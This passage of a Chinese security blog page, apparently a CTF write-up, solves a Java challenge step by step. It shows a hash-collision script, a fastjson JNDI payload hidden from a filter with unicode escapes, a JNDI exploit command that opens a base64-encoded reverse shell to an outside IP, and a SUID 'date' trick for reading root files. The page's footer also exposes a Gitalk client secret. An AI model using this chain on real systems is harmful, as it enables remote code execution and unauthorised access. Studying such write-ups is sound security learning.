+            JSON.parseObject(input);
+        }
+        return &quot;hello&quot;;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="26"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/07c403e8168d2.png" alt="image-20220709144338445" loading="lazy"></figure>
+<p>这里访问首页会得到一串Key，然后访问/json路由，会对传入的<code>str</code>的<code>hashcode</code>和<code>Key</code>的<code>hashcode</code>进行比较，如果hashcode相等而值不相等的话，就可以进入<code>if</code>。这里直接网上找个脚本，然后hash碰撞就行了。</p>
+<pre><code class="language-java">package cz.topolik.hashcodecollisions;
+
+import java.util.ArrayList;
+import java.util.LinkedList;
+import java.util.List;
+
+/**
+ * @author Tomas Polesovsky
+ *
+ * Find String.hashCode() collisions to a given string as a postfix to a chosen word
+ */
+public class StringHashCodeCollisionsPostfixator {
+
+   public static void main(String[] args) {
+      String originalString = &quot;ZeJ3LMiSCZ5RLdYN&quot;;
+      String prefix = &quot;&quot;;
+      int depth = 16;
+
+      if (args.length &gt; 2) {
+         originalString = args[0];
+         prefix = args[1];
+         depth = Integer.parseInt(args[2]);
+      } else {
+         System.out.println(&quot;Syntax: java StringHashCodeCollisionsPostfixator [originalString] [prefix] [depth &gt;= 1]&quot;);
+      }
+
+
+      long time = System.currentTimeMillis();
+
+      findCollision(prefix, originalString, depth);
+
+      System.out.println(&quot;Time: &quot; + (System.currentTimeMillis() - time));
+   }
+
+
+   private static void findCollision(String word, String originalWord, int depth) {
+      int targetHashCode = originalWord.hashCode();
+
+      System.out.println(&quot;Searching collisions for target: '&quot; + word + &quot;' (hashCode: &quot; + word.hashCode() + &quot;) with source: &quot; + originalWord + &quot; (hashcode: &quot; + targetHashCode + &quot;) into depth: &quot; + depth);
+
+      int currentHC = word.hashCode();
+
+      List&lt;Thread&gt; threads = new ArrayList&lt;&gt;(depth);
+
+      for (int i = 1; i &lt;= depth; i++) {
+         final int currentDepth = i;
+
+         threads.add(
+            new Thread(()-&gt;{
+               LinkedList&lt;Character&gt; stack = new LinkedList&lt;&gt;();
+
+               if (!compute(targetHashCode, currentHC, currentDepth, stack)) {
+                  System.out.println(&quot;Not found in depth &quot; + currentDepth);
+                  return;
+               }
+
+               StringBuffer result = new StringBuffer();
+               result.append(word);
+               for (Character ch : stack) {
+                  result.append(ch);
+               }
+
+               String collidingWord = result.toString();
+
+               StringBuffer sb = new StringBuffer();
+               sb.append(&quot;Found in depth &quot; + currentDepth + &quot;: &quot;);
+               sb.append(collidingWord);
+               sb.append(&quot; hashCode(): &quot;);
+               sb.append(collidingWord.hashCode());
+               System.out.println(sb.toString());
+
+            }
+         ));
+      }
+
+
+      int availableProcessors = Runtime.getRuntime().availableProcessors();
+      if (availableProcessors &gt; 1) {
+         availableProcessors--;
+      }
+
+      int pos = 0;
+      while(pos &lt; threads.size()) {
+         int alive = 0;
+         for (int i = 0; i &lt; pos; i++) {
+            alive += threads.get(i).isAlive() ? 1 : 0;
+         }
+         for (int i = 0; i &lt; (availableProcessors - alive); i++) {
+            if (pos &lt; threads.size()) {
+               threads.get(pos++).start();
+            }
+         }
+
+         try {
+            Thread.currentThread().sleep(10);
+         } catch (InterruptedException e) {}
+      }
+
+      for (int i = 0; i &lt; threads.size(); i++) {
+         try {
+            threads.get(i).join();
+         } catch (InterruptedException e) {}
+      }
+   }
+
+   private static boolean compute(int targetHashCode, int currentHashCode, int depth, LinkedList&lt;Character&gt; stack) {
+      if (depth == 0) {
+         return targetHashCode == currentHashCode;
+      }
+
+      // use 31 printable chars only
+      for (int ch = 64; ch &lt; 96; ch++) {
+         int hash = currentHashCode*31 + ch;
+
+         if (hash == targetHashCode) {
+            stack.push(new Character((char) (ch&amp;0xff)));
+            return true;
+         }
+
+         boolean result = compute(targetHashCode, hash, depth-1, stack);
+
+         if (result) {
+            stack.push(new Character((char) (ch&amp;0xff)));
+            return true;
+         }
+      }
+
+      return false;
+   }
+}
+</code></pre>
+<figure data-type="image" tabindex="27"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/493319ac17375.png" alt="image-20220709144916763" loading="lazy"></figure>
+<p>得到AZUSCMA。然后就是一个正则匹配，不允许出现<code>rmi</code>，<code>jndi</code>，<code>ldap</code>等字样，在fastjson中可以使用unicode来绕过这些限制。然后根据pom.xml可以得到fastjson是1.2.62版本，这个版本有一个非常常见的payload:</p>
+<pre><code>{&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://101.43.66.67:1099/17zvqg&quot;}&quot;;
+</code></pre>
+<p>由于这里禁止了rmi和jndi，所以需要unicode编码一下:</p>
+<pre><code>http://eci-2zegnz60o2ksenaot3j4.cloudeci1.ichunqiu.com:8888/?str=AZUSCMA
+POST:
+input={&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter&quot;,&quot;AsText&quot;:&quot;\u0072\u006d\u0069://101.43.66.67:1099/17zvqg&quot;}
+</code></pre>
+<p>使用<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>起一个rmi服务</p>
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}&quot; -A &quot;101.43.66.67&quot;
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/f571b88260ded.png" alt="image-20220709144148155" loading="lazy"></figure>
+<p>然后直接打过去，成功反弹shell</p>
+<figure data-type="image" tabindex="29"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/3e53cfb37d034.png" alt="image-20220709144235244" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/40f84abe91729.png" alt="image-20220709144417452" loading="lazy"></figure>
+<p>然后flag.txt在root目录，没有权限读取，然后发现<code>suid</code>有<code>date</code>，参考链接: https://gtfobins.github.io/gtfobins/date/#sudo</p>
+<figure data-type="image" tabindex="31"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/24816cefa3e34.png" alt="image-20220709152423997" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/749bc7655e09d.png" alt="image-20220709144532489" loading="lazy"></figure>
+<p>采用suid来读取文件</p>
+<pre><code>LFILE=/root/flag.txt
+date -f $LFILE
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/09/f4d4f59c4243b.png" alt="image-20220709144611424" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>flag{eebb424f-49c0-4a73-b1df-70ae1d08b3a8}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#2021%E5%B9%B4">2021年</a>
+<ul>
+<li><a href="#gkctf-2021babycat">[GKCTF 2021]babycat</a>
+<ul>
+<li><a href="#%E8%B4%A6%E5%8F%B7%E6%B3%A8%E5%86%8C">账号注册</a></li>
+<li><a href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">任意文件读取</a></li>
+<li><a href="#%E8%B6%8A%E6%9D%83admin">越权admin</a></li>
+<li><a href="#xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">XMLDecoder反序列化</a></li>
+</ul>
+</li>
+<li><a href="#tctf0ctf-final-2021-buggyloader-only-2-solved">[TCTF/0CTF Final 2021] buggyloader (only 2 solved)</a>
+<ul>
+<li><a href="#%E6%96%B9%E6%B3%951-templatesimpl">方法1 TemplatesImpl</a></li>
+<li><a href="#%E6%96%B9%E6%B3%952-rmiconnectorserver">方法2 RMIConnectorServer</a>
+<ul>
+<li><a href="#exp">EXP</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#2022%E5%B9%B4">2022年</a>
+<ul>
+<li><a href="#mrctf-2022ezjava">[MRCTF 2022]EzJava</a>
+<ul>
+<li><a href="#jar%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">jar目录结构</a></li>
+<li><a href="#filecontroller">FileController</a></li>
+<li><a href="#hellocontroller">HelloController</a></li>
+<li><a href="#serialkillerxml">serialkiller.xml</a></li>
+<li><a href="#bypass-blacklist">Bypass blacklist</a></li>
+<li><a href="#gadget">Gadget</a></li>
+</ul>
+</li>
+<li><a href="#%E8%93%9D%E5%B8%BD%E6%9D%AF-2022ez_gadget">[蓝帽杯 2022]Ez_gadget</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/SecInterview/">
+              <h3 class="post-title">
+                SecInterView Wiki
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
